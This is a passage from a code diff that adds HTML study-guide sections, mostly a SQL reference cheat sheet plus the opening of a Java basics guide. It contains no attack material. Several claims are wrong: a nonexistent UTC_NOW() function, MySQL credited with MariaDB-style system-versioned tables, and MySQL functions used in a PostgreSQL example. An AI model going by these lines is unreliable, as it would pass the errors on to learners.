+    SELECT DISTINCT user_id
+    FROM orders
+    WHERE amount &gt; 1000
+);
+
+-- NOT IN (beware NULLs!)
+SELECT username
+FROM users
+WHERE id NOT IN (
+    SELECT user_id FROM banned_users WHERE user_id IS NOT NULL
+);
+
+-- Correlated subquery (references outer query — runs once per row)
+SELECT username, age
+FROM users u
+WHERE age &gt; (
+    SELECT AVG(age)
+    FROM users
+    WHERE country = u.country   -- References outer query's row
+);
+
+-- EXISTS / NOT EXISTS (more efficient than IN for large datasets)
+SELECT username
+FROM users u
+WHERE EXISTS (
+    SELECT 1
+    FROM orders o
+    WHERE o.user_id = u.id AND o.amount &gt; 1000
+);
+
+-- Subquery in FROM (derived table)
+SELECT dept, avg_salary
+FROM (
+    SELECT department AS dept, AVG(salary) AS avg_salary
+    FROM employees
+    GROUP BY department
+) AS dept_averages
+WHERE avg_salary &gt; 60000;
+</code></pre>
+
+`,
+  "study-guide-sql-09": `
+<h2>9. Common Table Expressions (CTEs)</h2>
+<pre><code>-- Basic CTE
+WITH active_users AS (
+    SELECT id, username, email
+    FROM users
+    WHERE is_active = TRUE
+)
+SELECT * FROM active_users WHERE age &gt; 25;
+
+-- Multiple CTEs
+WITH 
+    revenue AS (
+        SELECT user_id, SUM(amount) AS total
+        FROM orders
+        GROUP BY user_id
+    ),
+    top_users AS (
+        SELECT user_id
+        FROM revenue
+        WHERE total &gt; 10000
+    )
+SELECT u.username, r.total
+FROM users u
+JOIN revenue r ON u.id = r.user_id
+WHERE u.id IN (SELECT user_id FROM top_users);
+
+-- Recursive CTE (hierarchy, tree, graph traversal)
+WITH RECURSIVE org_chart AS (
+    -- Base case: top-level employees (no manager)
+    SELECT id, name, manager_id, 0 AS level
+    FROM employees
+    WHERE manager_id IS NULL
+
+    UNION ALL
+
+    -- Recursive case: find direct reports
+    SELECT e.id, e.name, e.manager_id, oc.level + 1
+    FROM employees e
+    JOIN org_chart oc ON e.manager_id = oc.id
+)
+SELECT * FROM org_chart ORDER BY level, name;
+
+-- Fibonacci with recursive CTE
+WITH RECURSIVE fib(a, b, n) AS (
+    SELECT 0, 1, 1
+    UNION ALL
+    SELECT b, a+b, n+1 FROM fib WHERE n &lt; 20
+)
+SELECT a AS fib FROM fib;
+</code></pre>
+
+`,
+  "study-guide-sql-10": `
+<h2>10. Window Functions</h2>
+<p>Window functions calculate over a "window" of related rows without collapsing them.</p>
+<pre><code>-- Syntax: function() OVER (PARTITION BY ... ORDER BY ...)
+
+-- ROW_NUMBER: unique sequential number
+SELECT username, age,
+    ROW_NUMBER() OVER (ORDER BY age DESC) AS age_rank
+FROM users;
+
+-- RANK: tied rows get same rank, gaps after ties
+-- DENSE_RANK: tied rows get same rank, no gaps
+SELECT username, age, score,
+    RANK()       OVER (ORDER BY score DESC) AS rank_with_gaps,
+    DENSE_RANK() OVER (ORDER BY score DESC) AS rank_no_gaps,
+    ROW_NUMBER() OVER (ORDER BY score DESC) AS unique_rank
+FROM scores;
+
+-- PARTITION BY (like GROUP BY within window)
+SELECT 
+    username,
+    department,
+    salary,
+    RANK() OVER (PARTITION BY department ORDER BY salary DESC) AS dept_rank
+FROM employees;
+
+-- NTH_VALUE, FIRST_VALUE, LAST_VALUE
+SELECT username, salary,
+    FIRST_VALUE(salary) OVER (PARTITION BY dept ORDER BY salary DESC) AS max_in_dept,
+    LAST_VALUE(salary) OVER (
+        PARTITION BY dept ORDER BY salary DESC
+        ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING
+    ) AS min_in_dept
+FROM employees;
+
+-- LAG and LEAD (look at previous/next row)
+SELECT month, revenue,
+    LAG(revenue, 1) OVER (ORDER BY month) AS prev_month,
+    revenue - LAG(revenue, 1, 0) OVER (ORDER BY month) AS growth
+FROM monthly_sales;
+
+-- NTILE: divide into n buckets
+SELECT username, score,
+    NTILE(4) OVER (ORDER BY score) AS quartile
+FROM scores;
+
+-- Running totals, moving averages
+SELECT 
+    date, amount,
+    SUM(amount) OVER (ORDER BY date ROWS UNBOUNDED PRECEDING) AS running_total,
+    AVG(amount) OVER (ORDER BY date ROWS 6 PRECEDING) AS weekly_avg,
+    SUM(amount) OVER (PARTITION BY YEAR(date), MONTH(date)) AS monthly_total
+FROM transactions;
+
+-- Frame specifications
+ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW   -- Cumulative
+ROWS BETWEEN 1 PRECEDING AND 1 FOLLOWING           -- Surrounding rows
+ROWS BETWEEN 6 PRECEDING AND CURRENT ROW           -- Last 7 rows
+RANGE BETWEEN INTERVAL 7 DAY PRECEDING AND CURRENT ROW  -- Date-based
+</code></pre>
+
+`,
+  "study-guide-sql-11": `
+<h2>11. String Functions</h2>
+<pre><code>-- MySQL string functions
+CONCAT('Hello', ', ', 'World')      -- 'Hello, World'
+CONCAT_WS(', ', 'a', 'b', 'c')     -- 'a, b, c' (with separator)
+LENGTH('hello')                      -- 5 (bytes)
+CHAR_LENGTH('hello')                 -- 5 (characters)
+UPPER('hello')                       -- 'HELLO'
+LOWER('HELLO')                       -- 'hello'
+TRIM('  hello  ')                    -- 'hello'
+LTRIM('  hello')                     -- 'hello'
+RTRIM('hello  ')                     -- 'hello'
+SUBSTRING('Hello', 2, 3)            -- 'ell' (1-indexed, start, length)
+LEFT('Hello', 3)                     -- 'Hel'
+RIGHT('Hello', 3)                    -- 'llo'
+LOCATE('ll', 'Hello')               -- 3 (1-indexed position)
+REPLACE('Hello World', 'World', 'SQL')  -- 'Hello SQL'
+REVERSE('hello')                     -- 'olleh'
+LPAD('42', 5, '0')                  -- '00042'
+RPAD('hi', 5, '!')                  -- 'hi!!!'
+REPEAT('ab', 3)                     -- 'ababab'
+STRCMP('a', 'b')                    -- -1, 0, or 1
+FORMAT(1234567.89, 2)               -- '1,234,567.89'
+MD5('password')                     -- MD5 hash
+SHA2('password', 256)               -- SHA256 hash
+
+-- Regex (MySQL 8.0+)
+WHERE email REGEXP '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}$'
+REGEXP_REPLACE(text, pattern, replacement)
+REGEXP_SUBSTR(text, pattern)
+</code></pre>
+
+`,
+  "study-guide-sql-12": `
+<h2>12. Date and Time Functions</h2>
+<pre><code>-- Current values
+NOW()                -- Current datetime: '2024-01-15 14:30:00'
+CURDATE()            -- Current date: '2024-01-15'
+CURTIME()            -- Current time: '14:30:00'
+UTC_NOW()
+
+-- Extraction
+YEAR('2024-01-15')      -- 2024
+MONTH('2024-01-15')     -- 1
+DAY('2024-01-15')       -- 15
+HOUR('14:30:00')        -- 14
+MINUTE('14:30:00')      -- 30
+SECOND('14:30:00')      -- 0
+DAYOFWEEK('2024-01-15') -- 2 (1=Sunday, 7=Saturday)
+DAYNAME('2024-01-15')   -- 'Monday'
+MONTHNAME('2024-01-15') -- 'January'
+WEEK('2024-01-15')      -- 3 (week number)
+QUARTER('2024-01-15')   -- 1
+
+-- Extract (standard SQL)
+EXTRACT(YEAR FROM date_column)
+EXTRACT(MONTH FROM date_column)
+EXTRACT(DAY FROM date_column)
+
+-- Arithmetic
+DATE_ADD('2024-01-15', INTERVAL 30 DAY)       -- '2024-02-14'
+DATE_SUB('2024-01-15', INTERVAL 1 MONTH)      -- '2023-12-15'
+ADDDATE('2024-01-15', 30)                     -- '2024-02-14'
+DATEDIFF('2024-02-14', '2024-01-15')          -- 30 (days)
+TIMESTAMPDIFF(MONTH, start_date, end_date)
+TIMEDIFF('14:30:00', '10:15:00')              -- '04:15:00'
+
+-- Formatting
+DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%s')       -- '2024-01-15 14:30:00'
+DATE_FORMAT(NOW(), '%M %d, %Y')               -- 'January 15, 2024'
+DATE_FORMAT(NOW(), '%W')                      -- 'Monday'
+STR_TO_DATE('01/15/2024', '%m/%d/%Y')         -- '2024-01-15' (parse)
+UNIX_TIMESTAMP('2024-01-15')                  -- Unix timestamp
+FROM_UNIXTIME(1705276800)                     -- Convert from Unix
+
+-- Common date queries
+WHERE created_at &gt;= CURDATE()                                    -- Today
+WHERE created_at &gt;= DATE_SUB(CURDATE(), INTERVAL 7 DAY)         -- Last 7 days
+WHERE YEAR(created_at) = 2024 AND MONTH(created_at) = 1        -- Jan 2024
+WHERE created_at BETWEEN '2024-01-01' AND '2024-01-31 23:59:59' -- Date range
+</code></pre>
+
+`,
+  "study-guide-sql-13": `
+<h2>13. Transactions</h2>
+<pre><code>-- Start transaction
+START TRANSACTION;
+-- or
+BEGIN;
+BEGIN TRANSACTION;
+
+-- Operations
+UPDATE accounts SET balance = balance - 500 WHERE id = 1;
+UPDATE accounts SET balance = balance + 500 WHERE id = 2;
+
+-- Commit (make permanent)
+COMMIT;
+
+-- Rollback (undo all changes)
+ROLLBACK;
+
+-- Savepoints (partial rollback)
+SAVEPOINT before_transfer;
+UPDATE accounts SET balance = balance - 500 WHERE id = 1;
+SAVEPOINT after_debit;
+UPDATE accounts SET balance = balance + 500 WHERE id = 2;
+
+ROLLBACK TO SAVEPOINT after_debit;  -- Undo only credit, keep debit
+ROLLBACK TO SAVEPOINT before_transfer;  -- Undo everything
+
+RELEASE SAVEPOINT after_debit;  -- Remove savepoint
+
+-- Isolation levels
+SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;  -- Dirty reads
+SET TRANSACTION ISOLATION LEVEL READ COMMITTED;    -- Default in PostgreSQL
+SET TRANSACTION ISOLATION LEVEL REPEATABLE READ;   -- Default in MySQL
+SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;      -- Strictest
+
+-- Auto-commit
+SET autocommit = 0;   -- Disable (MySQL)
+SET autocommit = 1;   -- Enable (default)
+</code></pre>
+
+`,
+  "study-guide-sql-14": `
+<h2>14. Views</h2>
+<pre><code>-- Create view
+CREATE VIEW active_user_summary AS
+SELECT 
+    u.id,
+    u.username,
+    u.email,
+    COUNT(o.id) AS order_count,
+    COALESCE(SUM(o.amount), 0) AS total_spent
+FROM users u
+LEFT JOIN orders o ON u.id = o.user_id
+WHERE u.is_active = TRUE
+GROUP BY u.id, u.username, u.email;
+
+-- Use view like a table
+SELECT * FROM active_user_summary WHERE total_spent &gt; 1000;
+
+-- Update view (if simple enough)
+UPDATE active_user_summary SET email = 'new@email.com' WHERE id = 1;
+
+-- Replace view
+CREATE OR REPLACE VIEW active_user_summary AS ...;
+
+-- Drop view
+DROP VIEW IF EXISTS active_user_summary;
+
+-- Materialized view (PostgreSQL — stored on disk)
+CREATE MATERIALIZED VIEW monthly_revenue AS
+SELECT YEAR(date) AS year, MONTH(date) AS month, SUM(amount) AS revenue
+FROM orders GROUP BY 1, 2;
+
+REFRESH MATERIALIZED VIEW monthly_revenue;
+</code></pre>
+
+`,
+  "study-guide-sql-15": `
+<h2>15. Stored Procedures and Functions</h2>
+<pre><code>-- Stored procedure (MySQL)
+DELIMITER //
+CREATE PROCEDURE GetUserOrders(IN user_id INT, IN min_amount DECIMAL(10,2))
+BEGIN
+    DECLARE done INT DEFAULT 0;
+
+    SELECT o.id, o.amount, o.date
+    FROM orders o
+    WHERE o.user_id = user_id
+      AND o.amount &gt;= min_amount
+    ORDER BY o.date DESC;
+END //
+DELIMITER ;
+
+-- Call procedure
+CALL GetUserOrders(1, 100.00);
+
+-- Function (returns a value)
+DELIMITER //
+CREATE FUNCTION CalculateTax(amount DECIMAL(10,2), rate DECIMAL(5,4))
+RETURNS DECIMAL(10,2)
+DETERMINISTIC
+BEGIN
+    RETURN ROUND(amount * rate, 2);
+END //
+DELIMITER ;
+
+-- Use function
+SELECT amount, CalculateTax(amount, 0.0875) AS tax FROM orders;
+
+-- Stored procedure with OUT parameters
+DELIMITER //
+CREATE PROCEDURE GetStats(IN dept VARCHAR(50), OUT avg_salary DECIMAL(10,2), OUT count INT)
+BEGIN
+    SELECT AVG(salary), COUNT(*) INTO avg_salary, count
+    FROM employees
+    WHERE department = dept;
+END //
+DELIMITER ;
+
+CALL GetStats('Engineering', @avg, @count);
+SELECT @avg, @count;
+</code></pre>
+
+`,
+  "study-guide-sql-16": `
+<h2>16. Performance and Query Optimization</h2>
+<pre><code>-- EXPLAIN shows query execution plan
+EXPLAIN SELECT * FROM users WHERE email = 'alice@example.com';
+EXPLAIN ANALYZE SELECT ...;  -- PostgreSQL
+
+-- Key columns in EXPLAIN output
+-- type: ALL (full scan, bad) → range → ref → eq_ref → const (fast)
+-- possible_keys: indexes that COULD be used
+-- key: index actually used
+-- rows: estimated rows examined
+-- Extra: "Using filesort", "Using index", etc.
+
+-- Index best practices
+-- 1. Index columns used in WHERE, JOIN ON, ORDER BY
+-- 2. Composite indexes: put highest-selectivity columns first
+-- 3. Avoid indexing low-cardinality columns (boolean, status)
+-- 4. Too many indexes slow down writes
+
+-- Common performance issues
+-- ❌ SELECT * (retrieve only needed columns)
+SELECT id, email FROM users;  -- Not SELECT *
+
+-- ❌ Functions on indexed columns disable index
+SELECT * FROM users WHERE YEAR(created_at) = 2024;  -- Bad
+SELECT * FROM users WHERE created_at BETWEEN '2024-01-01' AND '2024-12-31'; -- Good
+
+-- ❌ Leading wildcard disables index
+WHERE name LIKE '%alice%';    -- Full scan
+WHERE name LIKE 'alice%';     -- Uses index
+
+-- ❌ NOT IN with NULLs
+WHERE id NOT IN (SELECT user_id FROM banned WHERE user_id IS NOT NULL);
+
+-- ✅ Use EXISTS instead
+WHERE NOT EXISTS (SELECT 1 FROM banned WHERE user_id = users.id);
+
+-- ✅ Use LIMIT for large results
+-- ✅ Pagination with keyset instead of OFFSET for large tables
+SELECT * FROM users WHERE id &gt; last_seen_id ORDER BY id LIMIT 20;
+
+-- Query hints (MySQL)
+SELECT /*+ USE_INDEX(users idx_email) */ * FROM users WHERE email = '...';
+SELECT * FROM users FORCE INDEX (idx_email) WHERE email = '...';
+</code></pre>
+
+`,
+  "study-guide-sql-17": `
+<h2>17. Advanced SQL Concepts</h2>
+<pre><code>-- PIVOT (rotate rows to columns — MySQL workaround)
+SELECT 
+    user_id,
+    SUM(CASE WHEN product = 'A' THEN amount ELSE 0 END) AS product_a,
+    SUM(CASE WHEN product = 'B' THEN amount ELSE 0 END) AS product_b,
+    SUM(CASE WHEN product = 'C' THEN amount ELSE 0 END) AS product_c
+FROM orders
+GROUP BY user_id;
+
+-- UNPIVOT (columns to rows)
+SELECT user_id, 'Q1' AS quarter, q1_sales AS sales FROM sales
+UNION ALL
+SELECT user_id, 'Q2', q2_sales FROM sales
+UNION ALL
+SELECT user_id, 'Q3', q3_sales FROM sales;
+
+-- Handling NULLs
+COALESCE(val1, val2, val3)    -- First non-NULL value
+NULLIF(a, b)                  -- NULL if a=b, else a
+IFNULL(expr, default)         -- MySQL: if NULL, use default
+NVL(expr, default)            -- Oracle equivalent
+IS NULL, IS NOT NULL          -- Never use = NULL
+
+-- JSON operations (MySQL 5.7+)
+SELECT data-&gt;&gt;'$.name' FROM users;  -- Extract JSON field
+SELECT JSON_EXTRACT(data, '$.address.city');
+UPDATE users SET data = JSON_SET(data, '$.phone', '555-1234');
+WHERE JSON_CONTAINS(data, '"admin"', '$.roles');
+
+-- Temporal tables / history tracking (MySQL 8.0.2+)
+CREATE TABLE products (
+    id INT AUTO_INCREMENT,
+    name VARCHAR(100),
+    price DECIMAL(10,2),
+    valid_from DATETIME(6) GENERATED ALWAYS AS ROW START,
+    valid_to DATETIME(6) GENERATED ALWAYS AS ROW END,
+    PERIOD FOR SYSTEM_TIME (valid_from, valid_to),
+    PRIMARY KEY (id)
+) WITH SYSTEM VERSIONING;
+
+SELECT * FROM products FOR SYSTEM_TIME AS OF '2024-01-01';
+SELECT * FROM products FOR SYSTEM_TIME ALL;
+</code></pre>
+
+`,
+  "study-guide-sql-18": `
+<h2>18. SQL Interview Questions</h2>
+<p><strong>Q: What is the difference between <code>WHERE</code> and <code>HAVING</code>?</strong>
+A: <code>WHERE</code> filters individual rows <strong>before</strong> grouping. <code>HAVING</code> filters <strong>groups</strong> after <code>GROUP BY</code>. You can only use aggregate functions in <code>HAVING</code>.</p>
+<p><strong>Q: What is a primary key vs a foreign key?</strong>
+A: Primary key uniquely identifies each row and cannot be NULL. Foreign key references a primary key in another table to enforce referential integrity.</p>
+<p><strong>Q: What is the difference between <code>INNER JOIN</code> and <code>LEFT JOIN</code>?</strong>
+A: <code>INNER JOIN</code> returns only rows that have matching records in <strong>both</strong> tables. <code>LEFT JOIN</code> returns all rows from the left table plus matching rows from the right (NULL if no match).</p>
+<p><strong>Q: What is the difference between <code>DELETE</code>, <code>TRUNCATE</code>, and <code>DROP</code>?</strong>
+A: <code>DELETE</code> removes specific rows (can be rolled back, slow). <code>TRUNCATE</code> removes all rows but keeps structure (can't be rolled back in MySQL, resets auto-increment). <code>DROP</code> removes the entire table including structure.</p>
+<p><strong>Q: What is a subquery? When would you use a CTE instead?</strong>
+A: A subquery is a query nested inside another. CTEs (WITH clauses) are more readable, reusable within the same query, and essential for recursive queries.</p>
+<p><strong>Q: What is a window function?</strong>
+A: A function that calculates a value over a "window" of related rows without collapsing the result set. Examples: <code>ROW_NUMBER()</code>, <code>RANK()</code>, <code>SUM() OVER()</code>, <code>LAG()</code>.</p>
+<p><strong>Q: Explain normalization and the first three normal forms.</strong>
+A: 1NF: Each column has atomic values (no arrays). 2NF: No partial dependency (every non-key column depends on the whole primary key). 3NF: No transitive dependency (non-key columns don't depend on other non-key columns).</p>
+
+<p><em>End of SQL Study Guide</em></p>
+
+`,
+  "study-guide-java-01": `
+<h2>1. What Is Java?</h2>
+<p>Java is a <strong>statically typed, object-oriented, compiled-then-interpreted</strong> programming language. Code compiles to <strong>bytecode</strong> which runs on the <strong>Java Virtual Machine (JVM)</strong> — making it platform-independent ("Write Once, Run Anywhere"). Created by James Gosling at Sun Microsystems in 1995.</p>
+<p>Key traits: strongly typed, garbage-collected, multithreaded, extensive standard library, massive enterprise ecosystem.</p>
+
+`,
+  "study-guide-java-02": `
+<h2>2. Java Basics</h2>
+<pre><code>// Every Java program needs a class matching the filename
+// File: HelloWorld.java
+public class HelloWorld {
+    public static void main(String[] args) {
+        System.out.println("Hello, World!");
+        System.out.print("No newline");
+        System.out.printf("Name: %s, Age: %d%n", "Alice", 25);
+    }
+}
+</code></pre>
+<pre><code># Compile
+javac HelloWorld.java   # Produces HelloWorld.class
+
+# Run
+java HelloWorld
+</code></pre>
+
+`,
+  "study-guide-java-03": `
+<h2>3. Variables and Primitive Types</h2>
+<p>Java has <strong>8 primitive types</strong> (lowercase) and <strong>reference types</strong> (classes, starts uppercase).</p>
+<pre><code>// Primitive types
+byte   b = 127;                // 8-bit  signed: -128 to 127
+short  s = 32767;              // 16-bit signed
+int    i = 2147483647;         // 32-bit signed (most common)
+long   l = 9223372036854775807L; // 64-bit signed (note L suffix)
+float  f = 3.14f;              // 32-bit float (note f suffix)
+double d = 3.141592653589793;  // 64-bit float (default decimal type)
+char   c = 'A';                // 16-bit Unicode character
+boolean flag = true;           // true or false
+
+// Literals
+int hex = 0xFF;                // 255
+int bin = 0b10101010;          // 170
+int big = 1_000_000;           // Underscores for readability
+long lng = 123_456_789L;
+
+// Reference types (null is default)
+String  str = "Hello";
+String  empty = null;
+int[]   arr = new int[10];
+int[]   arr2 = {1, 2, 3};
+
+// Type casting
+int x = (int) 3.99;           // Explicit: 3 (truncates)
+double y = 5;                  // Implicit widening: 5.0
+long big2 = (long) Integer.MAX_VALUE + 1;  // Explicit to avoid overflow
+
+// Wrapper classes (primitives as objects)
+Integer.MAX_VALUE              // 2147483647
+Integer.MIN_VALUE              // -2147483648
+Integer.parseInt("42")         // int from String
+Integer.toString(42)           // String from int
+Integer.toBinaryString(255)    // "11111111"
+Integer.toHexString(255)       // "ff"
+Double.parseDouble("3.14")
+Boolean.parseBoolean("true")
+
+// Autoboxing/unboxing
+Integer boxed = 42;            // int → Integer (autoboxing)
+int unboxed = boxed;           // Integer → int (unboxing)
+List&lt;Integer&gt; list = new ArrayList&lt;&gt;();
+list.add(42);                  // Autoboxed
+int val = list.get(0);        // Unboxed
+</code></pre>
+
+`,
+  "study-guide-java-04": `
+<h2>4. Strings</h2>
+<pre><code>// Strings are immutable objects in Java
+String s = "Hello, World!";
+String s2 = new String("Hello");   // Creates new object (avoid)
+
+// Common methods
+s.length()                    // 13
+s.charAt(0)                   // 'H'
+s.indexOf("World")            // 7
+s.lastIndexOf("o")            // 8
+s.substring(7)                // "World!"
+s.substring(7, 12)            // "World"
+s.toLowerCase()               // "hello, world!"
+s.toUpperCase()               // "HELLO, WORLD!"
+s.trim()                      // Remove leading/trailing whitespace
+s.strip()                     // Unicode-aware trim (Java 11+)
+s.replace("World", "Java")    // "Hello, Java!"
+s.replaceAll("[aeiou]", "*")  // Regex replace
+s.contains("World")           // true
+s.startsWith("Hello")         // true
+s.endsWith("!")               // true
+s.equals("Hello, World!")     // true (content comparison)
+s.equalsIgnoreCase("hello")   // false
+s.compareTo("Hello")          // Lexicographic comparison
+s.isEmpty()                   // false
+s.isBlank()                   // false (Java 11+)
+s.split(", ")                 // ["Hello", "World!"]
+s.split(",", 2)               // Limit splits to 2 parts
+String.join(", ", "a", "b")   // "a, b"
+String.join("-", list)
+s.toCharArray()               // char[]
+s.chars()                     // IntStream of char values
+s.formatted("World")          // Java 15+ (like String.format)
+
+// String comparison — NEVER use == for content!
+String a = "hello";
+String b = "hello";
+a == b;        // May be true (string pool) — don't rely on this
+a.equals(b);   // true — always use this
+
+// String.format
+String msg = String.format("Name: %s, Age: %d, Score: %.2f", name, age, score);
+// Format specifiers: %s String, %d int, %f float, %b boolean, %c char
+// Width: %10s (right-align), %-10s (left-align)
+// Precision: %.2f (2 decimal places)
+// %n = newline (platform-independent)
+
+// StringBuilder (mutable — use in loops)
+StringBuilder sb = new StringBuilder();
+sb.append("Hello");
+sb.append(", ");
+sb.append("World");
+sb.insert(5, "!");
+sb.delete(5, 6);
+sb.replace(0, 5, "Greetings");
+sb.reverse();
+sb.toString();              // Convert to String
+sb.length();
+sb.charAt(0);
+
+// Always prefer StringBuilder over concatenation in loops:
+// Bad:  String result = ""; for(...) result += item;
+// Good: StringBuilder sb = new StringBuilder(); for(...) sb.append(item);
+
+// Text blocks (Java 15+)
+String json = """
+        {
+            "name": "Alice",
+            "age": 25
+        }
+        """;
+</code></pre>
+
+`,
+  "study-guide-java-05": `
+<h2>5. Arrays</h2>
+<pre><code>// Declaration and initialization
+int[] numbers = new int[5];              // [0, 0, 0, 0, 0]
+String[] names = new String[3];          // [null, null, null]
+int[] primes = {2, 3, 5, 7, 11};        // Inline initialization
+int[] more = new int[]{1, 2, 3};        // Explicit
+
+// Access
+primes[0]         // 2
+primes[primes.length - 1]  // 11
+// primes[5]      // ArrayIndexOutOfBoundsException
+
+// 2D arrays
+int[][] matrix = new int[3][4];
+int[][] grid = {{1,2,3},{4,5,6},{7,8,9}};
+grid[1][2]        // 6
+grid.length       // 3 (rows)
+grid[0].length    // 3 (cols)
+
+// Jagged arrays
+int[][] jagged = new int[3][];
+jagged[0] = new int[2];
+jagged[1] = new int[5];
+
+// java.util.Arrays
+import java.util.Arrays;
+Arrays.sort(numbers);                    // Sort in place (ascending)
+Arrays.sort(names, String::compareToIgnoreCase);
+Arrays.binarySearch(numbers, 5);        // Only on sorted arrays
+Arrays.fill(numbers, 0);               // Fill with value
+Arrays.copyOf(numbers, 10);            // Copy, extend/truncate
+Arrays.copyOfRange(numbers, 1, 4);     // Subarray
+Arrays.equals(arr1, arr2);             // Element-wise comparison
+Arrays.deepEquals(matrix1, matrix2);   // For nested arrays
+Arrays.toString(numbers);             // "[2, 3, 5, 7, 11]"
+Arrays.deepToString(matrix);          // For nested arrays
+int[] copy = numbers.clone();         // Shallow copy
+
+// Enhanced for loop
+for (int n : primes) {
+    System.out.println(n);
+}
+
+// Convert array to List
+List&lt;String&gt; list = Arrays.asList("a", "b", "c");  // Fixed-size!
+List&lt;String&gt; list2 = new ArrayList&lt;&gt;(Arrays.asList("a", "b"));  // Mutable
+
+// Convert List to array
+String[] arr = list.toArray(new String[0]);
+</code></pre>
+
+`,
+  "study-guide-java-06": `
+<h2>6. Control Flow</h2>
+<pre><code>// if / else if / else
+int score = 85;
+if (score &gt;= 90) {
+    System.out.println("A");
+} else if (score &gt;= 80) {
+    System.out.println("B");
+} else {
+    System.out.println("F");
+}
+
+// Ternary
+String grade = score &gt;= 60 ? "Pass" : "Fail";
+
+// switch (classic)
+switch (day) {
+    case "Monday":
+    case "Tuesday":
+        System.out.println("Weekday");
+        break;
+    case "Saturday":
+    case "Sunday":
+        System.out.println("Weekend");
+        break;
+    default:
+        System.out.println("Unknown");
+}
+
+// switch expression (Java 14+)
+String result = switch (day) {
+    case "Monday", "Tuesday", "Wednesday", "Thursday", "Friday" -&gt; "Weekday";
+    case "Saturday", "Sunday" -&gt; "Weekend";
+    default -&gt; throw new IllegalArgumentException("Unknown day: " + day);
+};
+
+// switch with yield (Java 14+)
+int numLetters = switch (day) {
+    case "Monday", "Friday", "Sunday" -&gt; 6;
+    case "Tuesday" -&gt; 7;
+    case "Wednesday" -&gt; 9;
+    case "Thursday", "Saturday" -&gt; 8;
+    default -&gt; {
+        int len = day.length();
+        yield len;  // yield returns a value from a block
+    }
+};
+
+// for loop
+for (int i = 0; i &lt; 10; i++) {
+    if (i == 5) continue;
+    if (i == 8) break;
+    System.out.println(i);
+}
+
+// while
+int n = 0;
+while (n &lt; 10) n++;
+
+// do-while
+do {
+    n--;
+} while (n &gt; 0);
+
+// Enhanced for (for-each)
+int[] arr = {1, 2, 3, 4, 5};
+for (int num : arr) {
+    System.out.println(num);
+}
+
+// Labeled break/continue
+outer:
+for (int i = 0; i &lt; 3; i++) {
+    for (int j = 0; j &lt; 3; j++) {
+        if (j == 1) continue outer;
+        if (i == 2) break outer;
+    }
+}
+</code></pre>
+
+`,
+  "study-guide-java-07": `
+<h2>7. Methods</h2>
+<pre><code>public class MathUtils {
+    // Instance method
+    public int add(int a, int b) {
+        return a + b;
+    }
+
+    // Static method (no object needed)
+    public static double circleArea(double radius) {
+        return Math.PI * radius * radius;
+    }
+
+    // Overloading (same name, different parameters)
+    public int max(int a, int b) {
+        return a &gt; b ? a : b;
+    }
+    public double max(double a, double b) {
+        return a &gt; b ? a : b;
+    }
+    public int max(int a, int b, int c) {
+        return max(max(a, b), c);
+    }
+
+    // Varargs (variable arguments)
+    public static int sum(int... numbers) {
+        int total = 0;
+        for (int n : numbers) total += n;
+        return total;
+    }
+    // sum(1, 2, 3);  sum(1, 2, 3, 4, 5);
+
+    // Recursion
+    public static long factorial(int n) {
+        if (n &lt;= 1) return 1;
+        return n * factorial(n - 1);
+    }
+}
+</code></pre>
+
+`,
+  "study-guide-java-08": `
+<h2>8. Object-Oriented Programming</h2>
+<pre><code>// Base class
+public class Animal {
+    // Fields
+    private String name;
+    private int age;
+    protected String sound;
+    public static int count = 0;    // Class variable
+
+    // Constructor
+    public Animal(String name, int age, String sound) {
+        this.name = name;
+        this.age = age;
+        this.sound = sound;
+        count++;
+    }
+
+    // Copy constructor
+    public Animal(Animal other) {
+        this(other.name, other.age, other.sound);
+    }
+
+    // Getters and Setters
+    public String getName() { return name; }
+    public void setName(String name) {
+        if (name == null || name.isEmpty())
+            throw new IllegalArgumentException("Name cannot be empty");
+        this.name = name;
+    }
+    public int getAge() { return age; }
+    public void setAge(int age) { this.age = age; }
+
+    // Instance method
+    public String speak() {
+        return name + " says " + sound + "!";
+    }
+
+    // Static method
+    public static int getCount() { return count; }
+
+    // Overriding Object methods
+    @Override
+    public String toString() {
+        return "Animal{name='" + name + "', age=" + age + "}";
+    }
+
+    @Override
+    public boolean equals(Object obj) {
+        if (this == obj) return true;
+        if (!(obj instanceof Animal)) return false;
+        Animal other = (Animal) obj;
+        return name.equals(other.name) &amp;&amp; age == other.age;
+    }
+
+    @Override
+    public int hashCode() {
+        return Objects.hash(name, age);
+    }
+}
+
+// Subclass (inheritance)
+public class Dog extends Animal {
+    private String breed;
+
+    public Dog(String name, int age, String breed) {
+        super(name, age, "Woof");   // Call parent constructor
+        this.breed = breed;
+    }
+
+    public String getBreed() { return breed; }
+
+    @Override
+    public String speak() {
+        return super.speak() + " *wags tail*";   // Call parent method
+    }
+
+    public void fetch(String item) {
+        System.out.println(getName() + " fetches the " + item + "!");
+    }
+}
+
+// Abstract class
+public abstract class Shape {
+    protected String color;
+
+    public Shape(String color) { this.color = color; }
+
+    // Abstract method — must be implemented by subclasses
+    public abstract double area();
+    public abstract double perimeter();
+
+    // Concrete method
+    public void describe() {
+        System.out.printf("A %s %s with area %.2f%n",
+            color, getClass().getSimpleName(), area());
+    }
+}
+
+public class Circle extends Shape {
+    private double radius;
+
+    public Circle(String color, double radius) {
+        super(color);
+        this.radius = radius;
+    }
+
+    @Override public double area() { return Math.PI * radius * radius; }
+    @Override public double perimeter() { return 2 * Math.PI * radius; }
+}
+
+// Interfaces
+public interface Flyable {
+    double MAX_ALTITUDE = 10000; // Implicitly public static final
+
+    void fly();                  // Implicitly public abstract
+
+    default void land() {        // Default implementation
+        System.out.println("Landing...");
+    }
+
+    static Flyable create() {    // Static factory method
+        return () -&gt; System.out.println("Flying!");
+    }
+}
+
+public interface Swimmable {
+    void swim();
+}
+
+// Implementing multiple interfaces
+public class Duck extends Animal implements Flyable, Swimmable {
+    public Duck(String name) { super(name, 1, "Quack"); }
+
+    @Override public void fly()  { System.out.println(getName() + " is flying!"); }
+    @Override public void swim() { System.out.println(getName() + " is swimming!"); }
+}
+
+// Records (Java 16+ — immutable data carriers)
+public record Point(int x, int y) {
+    // Auto-generates: constructor, getters (x(), y()), toString, equals, hashCode
+
+    // Compact constructor (validation)
+    public Point {
